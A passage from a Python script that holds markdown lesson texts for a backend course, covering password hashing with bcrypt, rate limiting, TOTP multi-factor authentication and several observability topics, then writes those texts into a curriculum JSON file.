**You must never store passwords in plaintext.** You must use cryptographic Hashing.

### Hashing vs Encryption

- **Encryption** is a two-way street. You encrypt data with a key, and you can decrypt it back to the original text. (Never use encryption for passwords, because if a hacker steals the database, they usually steal the decryption key too).
- **Hashing** is a one-way mathematical meat grinder. You put `"password123"` in, and you get `"abc987..."` out. It is mathematically impossible to reverse the hash back into `"password123"`.

### The Authentication Flow

1. **Registration**: User sends `"password123"`. Backend hashes it to `"abc987"`. Backend saves `"abc987"` in the database.
2. **Login**: User sends `"password123"`. Backend hashes it to `"abc987"`. Backend compares the new hash to the hash in the database. If they match, access is granted. The backend never knows the actual password!

### Salting and bcrypt

If two users have the password `"password123"`, a basic hashing algorithm (like MD5 or SHA-256) will output the exact same hash. Hackers use "Rainbow Tables" (massive pre-computed lists of common passwords and their hashes) to instantly reverse lookup millions of weak passwords.

**Salting** fixes this. Before hashing, the backend generates a random string (the Salt) and attaches it to the password (`"password123" + "xYz12"`). Now, identical passwords produce completely different hashes.

The industry standard library is **`bcrypt`**. It handles salting automatically and is intentionally slow (Key Stretching). By forcing the algorithm to take 250 milliseconds to run, it prevents hackers from brute-forcing millions of guesses per second.

```javascript
const bcrypt = require('bcrypt');
const saltRounds = 10; // Determines how slow/secure the algorithm is

// Registration
const plainTextPassword = req.body.password;
const hashedPassword = await bcrypt.hash(plainTextPassword, saltRounds);
db.saveUser(username, hashedPassword);

// Login
const isValid = await bcrypt.compare(req.body.password, user.hashedPassword);
```""",

    ("Advanced Authentication & Security", "Rate Limiting"): """## Defending Against Abuse

An API that allows unlimited requests is a massive vulnerability. 
- A hacker could write a script to try 10,000 passwords a second (Brute Force attack).
- A competitor could write a script to scrape your entire database.
- A malicious actor could launch a DDoS (Distributed Denial of Service) attack, sending millions of requests to overload your database and crash the server.

**Rate Limiting** restricts the number of requests a client can make within a specific time window.

### Implementing Rate Limiting

Rate limiting is usually implemented as Express Middleware, often backed by Redis (since checking a slow SQL database for every request defeats the purpose of stopping a DDoS attack).

A popular Node.js library is `express-rate-limit`.

```javascript
const rateLimit = require('express-rate-limit');

// 1. Define the rules
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 5, // Limit each IP to 5 login requests per `window`
    message: "Too many login attempts, please try again after 15 minutes",
    standardHeaders: true, // Return rate limit info in the `RateLimit-*` headers
});

// 2. Apply it ONLY to the vulnerable endpoint
app.post('/api/login', loginLimiter, (req, res) => {
    // Login logic...
});
```

### Types of Limits

1. **IP-Based Limiting**: Limits requests from a specific IP address (Used above). Necessary for unauthenticated routes (like login or signup).
2. **User-Based Limiting**: Limits requests based on the authenticated User ID in the JWT. Necessary for preventing a malicious authenticated user from scraping APIs.

### HTTP Headers

When an API is rate-limited, it should return a **`429 Too Many Requests`** HTTP status code. 

Professional APIs include headers in the response to inform the client of the limits:
- `X-RateLimit-Limit`: Total requests allowed in the window (e.g., 100).
- `X-RateLimit-Remaining`: Requests remaining in the current window (e.g., 99).
- `X-RateLimit-Reset`: Unix timestamp of when the limit will reset. Frontend developers use this to show a countdown timer.""",

    ("Advanced Authentication & Security", "Multi-Factor Authentication (MFA)"): """## Defense in Depth

In the modern security landscape, a password alone is insufficient. Users reuse weak passwords, and phishing attacks routinely trick users into handing them over. 

**Multi-Factor Authentication (MFA)** requires the user to provide two or more verification factors to gain access.

The factors fall into three categories:
1. **Something you know** (A password, a PIN).
2. **Something you have** (A smartphone app generating a code, a YubiKey hardware token).
3. **Something you are** (Fingerprint, FaceID).

### Time-Based One-Time Passwords (TOTP)

The most common engineering implementation of MFA (used by Google Authenticator or Authy) is the **TOTP** algorithm.

**How to Implement TOTP Backend Logic:**
1. **Setup**: When the user enables MFA, your backend generates a cryptographically secure random secret key (e.g., `JBSWY3DPEHPK3PXP`).
2. **Storage**: Save this secret key in the database attached to the user.
3. **Sharing**: Present this secret to the user as a QR Code. The user scans it with their Authenticator app. *Now, both the backend and the user's phone have the exact same secret key.*
4. **The Algorithm**: The Authenticator app takes the Secret Key, combines it with the *Current Unix Time (rounded to the nearest 30 seconds)*, and runs a mathematical hashing algorithm (HMAC) to generate a 6-digit code.
5. **Verification**: When logging in, the user types the 6-digit code. Your backend takes the user's secret from the database, grabs its own server time, and runs the exact same math. If the backend's generated code matches the user's provided code, access is granted.

```javascript
// Using the 'otplib' library in Node.js
const otplib = require('otplib');

// VERIFICATION AT LOGIN
const isValid = otplib.authenticator.check(
    userInputCode, // e.g., "123456"
    userDatabaseSecret // e.g., "JBSWY3DPEHPK3PXP"
);

if (isValid) {
    // Generate JWT and log them in
}
```

Because TOTP relies purely on a shared secret and synchronized clocks, it operates completely offline. The user's phone does not need cellular service or wifi to generate the code!""",

    ("System Observability & Monitoring Masterclass", "The Three Pillars of Observability"): """## Flying Blind in Production

When your backend code runs on your local laptop, debugging is easy. You can read `console.log()` outputs in the terminal or use a debugger to step through code.

When your code is deployed to a cloud cluster of 15 microservices running across 50 independent servers, handling 10,000 requests a second, `console.log()` is entirely useless. If a user complains that "checkout failed," you have no way to know which of the 50 servers processed their request, or where the error occurred.

**Observability** is the architectural practice of designing your systems to expose their internal state so that engineers can diagnose problems in production.

The industry defines Observability through Three Pillars:
1. **Logs**: A record of discrete, timestamped events (e.g., "User 42 logged in at 10:05 AM").
2. **Metrics**: Aggregated numerical data over time (e.g., "CPU usage is at 85%", "We are processing 400 requests per second").
3. **Distributed Traces**: The execution path of a single request as it travels across multiple different microservices.

An unobservable system is a ticking time bomb. When it goes down at 3 AM, engineers will spend hours guessing what broke, rather than minutes fixing the root cause.""",

    ("System Observability & Monitoring Masterclass", "Structured Logging"): """## Stop using console.log

The first mistake backend developers make is writing unstructured logs:
`console.log("Error: User 42 failed to purchase item 105 due to Timeout");`

This is a string. If you send 10 million of these strings to a centralized logging server (like Datadog or Splunk), and your manager asks, "How many timeouts happened for item 105 today?", you are forced to write complex, brittle Regex queries to extract the data.

### Structured Logging (JSON)

Modern backends use **Structured Logging**. Instead of writing strings, you output JSON objects. 

Every log entry should contain the timestamp, the severity level, the specific message, and a payload of searchable metadata.

```javascript
// Example using 'Winston' or 'Pino' in Node.js
logger.error({
    event: "PURCHASE_FAILED",
    userId: 42,
    itemId: 105,
    error_type: "TIMEOUT",
    message: "Database connection timed out during checkout"
});
```

### Why JSON is Powerful

When this JSON object is ingested by a log aggregator (like AWS CloudWatch or ElasticSearch), the system automatically indexes every key.

You can now instantly query your entire server fleet with SQL-like precision:
`SELECT COUNT(*) FROM logs WHERE error_type = 'TIMEOUT' AND itemId = 105`

### Log Levels

Not all logs are equal. You must categorize them using Levels to filter noise during a crisis:
- **DEBUG**: Extremely granular details (e.g., raw SQL queries). Usually turned off in production to save money.
- **INFO**: Standard business events (e.g., "User Signed Up").
- **WARN**: Something unexpected happened, but the app recovered (e.g., "API rate limit approaching", or "Retrying database connection").
- **ERROR**: A specific operation failed (e.g., "Failed to process payment"). Requires attention.
- **FATAL**: The entire application has crashed and is offline. Triggers pagers instantly.""",

    ("System Observability & Monitoring Masterclass", "Distributed Tracing"): """## Finding the Bottleneck

In a Microservice architecture, a single HTTP request from a frontend might trigger a cascade of internal network calls. 

User clicks "Checkout" -> Hits `API_Gateway` -> Calls `Auth_Service` -> Calls `Inventory_Service` -> Calls `Payment_Service` (which queries a SQL database).

If the user complains the checkout took 10 seconds, which service caused the delay? Looking at the logs of 5 different servers is a nightmare. 

**Distributed Tracing** (via tools like Jaeger or OpenTelemetry) maps the entire journey of a request.

### The Trace ID and Spans

1. **The Trace ID**: When the `API_Gateway` receives the initial request, it generates a unique UUID (e.g., `trace-xyz-123`).
2. **Propagation**: When the Gateway makes an HTTP request to the `Auth_Service`, it injects this Trace ID into the HTTP Headers (`X-Trace-Id: trace-xyz-123`). The `Auth_Service` does the same when it calls the next service.
3. **Spans**: Every time a service does work (e.g., executes a SQL query), it records a "Span"—the start time and end time of that specific action, tagged with the Trace ID.
4. **Aggregation**: All services asynchronously send their Spans to a central Tracing Server.

### The Waterfall Visualization

The Tracing Server pieces the Spans together using the Trace ID and generates a visual Gantt chart (a Waterfall graph).

Engineers can look at the visualizer and instantly see:
- Total Time: 10.0s
  - `API_Gateway`: 10.0s
    - `Auth_Service`: 0.1s
    - `Inventory_Service`: 0.2s
    - `Payment_Service`: 9.7s (RED FLAG!)
      - `SQL_Query(UPDATE account...)`: 9.6s (ROOT CAUSE FOUND!)

Tracing turns hours of distributed debugging into a 10-second visual diagnosis. It is mandatory for modern microservice architectures.""",

    ("System Observability & Monitoring Masterclass", "Application Metrics"): """## Taking the Pulse of the System

Logs are great for investigating *why* a specific error happened. But if you have 10,000 requests a second, generating a JSON log for every successful request will bankrupt your company in logging fees.

To understand the macro-level health of a system, we use **Metrics**. Metrics are incredibly cheap to store because they are just time-series aggregations (numbers).

Instead of logging 10,000 JSON objects, a metrics agent (like Prometheus) simply increments a counter: `http_requests_total = 10000`.

### The RED Method

When monitoring an API, Site Reliability Engineers (SREs) focus on the RED metrics:

1. **Rate**: The number of requests per second (RPS). Tells you the load on the system.
2. **Errors**: The number of failed requests (HTTP 5xx codes). Spikes indicate a deployment broke something.
3. **Duration**: The latency of requests (Response Time). Usually measured in Percentiles.

### Why Averages Lie (Percentiles)

If you have 9 fast requests (10ms) and 1 catastrophic request (1000ms), the **Average (Mean) Latency** is 109ms. This looks perfectly healthy, hiding the fact that 10% of your users are having a terrible experience.

Metrics systems track **Percentiles** (p50, p90, p99).
- **p50 (Median)**: 50% of requests are faster than this number.
- **p99**: 99% of requests are faster than this number. The 1% are the outliers.

If your dashboard shows a p99 latency of 3000ms, it means 1 out of every 100 users is staring at a loading spinner for 3 seconds. Optimizing the p99 latency is a core responsibility of backend engineering.""",

    ("System Observability & Monitoring Masterclass", "Health Checks"): """## Keeping the Fleet Alive

In cloud environments (AWS, Kubernetes), servers are ephemeral. Virtual machines crash, run out of memory, or lose network connectivity constantly. 

A Load Balancer is responsible for distributing incoming user traffic across your fleet of 10 backend servers. But if Server #4 crashes, how does the Load Balancer know to stop sending users to it?

### The Health Check Endpoint

Every robust backend application must expose a dedicated, unauthenticated route—usually `GET /health` or `GET /ping`.

The Load Balancer pings this endpoint on every server every 10 seconds.
- If it returns `200 OK`, the server is marked "Healthy" and receives traffic.
- If it times out or returns `500`, the server is marked "Unhealthy". The Load Balancer instantly cuts off traffic to that server and often instructs the cloud provider to kill the virtual machine and spin up a fresh one automatically.

### Deep vs Shallow Health Checks

**Shallow Check:**
```javascript
app.get('/health', (req, res) => {
    res.status(200).send("OK");
});
```
This only proves the Node.js process is running and Express is accepting connections.

**Deep Check (Readiness Probe):**
What if Node is running, but the database connection was dropped? A shallow check will return `200 OK`, the Load Balancer will send users to the server, and every user will experience a Database Error!

```javascript
app.get('/health/ready', async (req, res) => {
    try {
        // Ping the database to ensure it's alive
        await db.execute('SELECT 1');
        // Ping the Redis cache
        await redis.ping();
        
        res.status(200).json({ status: "READY" });
    } catch (error) {
        // The app is alive, but broken. Stop sending traffic!
        res.status(503).json({ status: "UNHEALTHY", reason: error.message });
    }
});
```""",

    ("System Observability & Monitoring Masterclass", "Alerting Strategies"): """## Avoiding Alert Fatigue

Metrics and Logs are useless if no one looks at them. When a critical threshold is breached, the monitoring system (like Datadog or PagerDuty) must trigger an **Alert** to wake up an engineer via SMS or phone call.

However, poorly configured alerts are one of the leading causes of engineering burnout, known as **Alert Fatigue**. 

### The Problem of Bad Alerts

If you configure an alert to page an engineer every time CPU usage hits 90%, the engineer will be woken up at 3 AM. They will log in, see the system auto-scaled, and go back to sleep.
After a month of 3 AM wake-ups for issues that fix themselves, the engineer will subconsciously start ignoring the pager. When a *real* catastrophic failure happens, they will sleep through it.

### Symptom-Based Alerting

The golden rule of modern alerting: **Page on Symptoms, not Causes.**

Users do not care if your CPU is at 99%. Users do not care if the database is running hot. Users only care about symptoms:
1. Is the website returning 500 errors?
2. Is the website taking 10 seconds to load?

**Bad Alerting (Cause-based):**
- *Alert*: "Redis memory is > 85%." (Send to a Slack channel for review on Monday, do not page).

**Good Alerting (Symptom-based):**
- *Alert*: "Error rate across the API is > 5% for 3 consecutive minutes." (PAGE THE ON-CALL ENGINEER IMMEDIATELY).
- *Alert*: "p99 Latency of Checkout endpoint > 5 seconds." (PAGE IMMEDIATELY).

Once the engineer is awake, they will look at the dashboards to find the *cause* (Ah, Redis memory is full), but the pager was strictly reserved for actual user pain.""",

    ("System Observability & Monitoring Masterclass", "Log Aggregation"): """## Centralizing the Truth

When you have a Monolith running on a single server, you can just SSH into the machine and read the `error.log` file using `grep`. 

In a modern architecture, you might have 50 Docker containers spinning up and shutting down dynamically. When a container is destroyed by Kubernetes, its local hard drive (and its local log files) are instantly deleted and lost forever.

### The Log Pipeline

To solve this, modern backends do not write logs to local files. They stream logs continuously over the network to a highly durable, centralized database designed for text search (like **Elasticsearch**, **Splunk**, or **Datadog**).

A standard open-source pipeline is the **ELK Stack**:
1. **Logstash / Fluentd**: A lightweight agent running on every server. It listens to the standard output (`stdout`) of your Node/Python app, grabs the JSON logs, and ships them over the network.
2. **Elasticsearch**: The massive, distributed database that receives the logs from all 50 servers and indexes them for lightning-fast full-text search.
3. **Kibana**: The frontend UI where engineers type queries (e.g., `error_type: "TIMEOUT" AND timestamp > "now-1h"`) to investigate incidents.

### Log Retention and Costs

Log aggregation is notoriously expensive. Companies generate terabytes of log data per day.
- **Hot Storage**: Logs from the last 7 days are kept in fast SSD memory (Elasticsearch) for immediate incident debugging.
- **Cold Storage**: After 7 days, logs are automatically zipped and moved to cheap, slow storage (like AWS S3) for compliance and auditing purposes.

To control costs, engineers use **Sampling**. If the server processes 10,000 successful GET requests a second, logging all 10,000 is a waste of money. The logging library is configured to only send 1% of `INFO` logs to the aggregator, while sending 100% of `ERROR` logs.""",

    ("System Observability & Monitoring Masterclass", "Handling Outages"): """## Incident Management

Despite all best practices, your backend will eventually suffer a catastrophic outage. The database will crash, a deployment will contain a fatal bug, or an AWS region will go offline.

How an engineering team handles a Sev-1 (Severity 1) incident defines their maturity.

### The Incident Flow

1. **Detection**: PagerDuty calls the On-Call Engineer at 2:00 AM based on a Symptom-based alert (Error rate > 10%).
2. **Triage**: The engineer logs into Datadog. They look at the RED metrics (Rate, Error, Duration). They see the `/checkout` endpoint is returning 500s.
3. **Communication**: They create a dedicated Slack channel (`#incident-2023-10-checkout`) and declare an incident, ensuring stakeholders (Customer Support, Management) know engineers are on it.
4. **Mitigation (Not Fix)**: The goal is to stop the bleeding instantly. If a recent code deployment caused it, they DO NOT try to debug the code. They click **Rollback**, instantly reverting the servers to the previous day's code. If the database is overwhelmed, they enable Rate Limiting to block traffic.
5. **Resolution**: Once the system is stable (even if degraded), engineers take time to find the root cause and write the actual code fix.

### The Blameless Post-Mortem

Within 48 hours of an outage, the team holds a Post-Mortem meeting. 

The industry standard is **Blamelessness**. You never say *"Alice broke the production database."* Humans make mistakes; systems should prevent them. 

You ask *"Why did the system allow Alice's bad query to crash the database?"*
You write a document detailing the timeline, the root cause, and Action Items to prevent it from ever happening again (e.g., "Add timeout limits to all SQL queries", "Improve test coverage for the checkout flow"). 

Every outage is the price you pay for an engineering lesson. A Post-Mortem ensures you get your money's worth."""
}

patched = 0
for category_name, category_data in data.items():
    for lesson in category_data.get("lessons", []):
        title = lesson["title"]
        key = (category_name, title)
        if key in theories and theories[key] is not None:
            old_len = len(lesson.get("theory", ""))
            lesson["theory"] = theories[key]
            new_len = len(lesson["theory"])
            print(f"  OK [{category_name}] {title}: {old_len} -> {new_len} chars")
            patched += 1

with open("curriculum/tracks/backend.json", "w", encoding="utf-8") as f:
    json.dump(data, f, indent=2, ensure_ascii=False)

print(f"\nPatched {patched} lessons in backend.json")
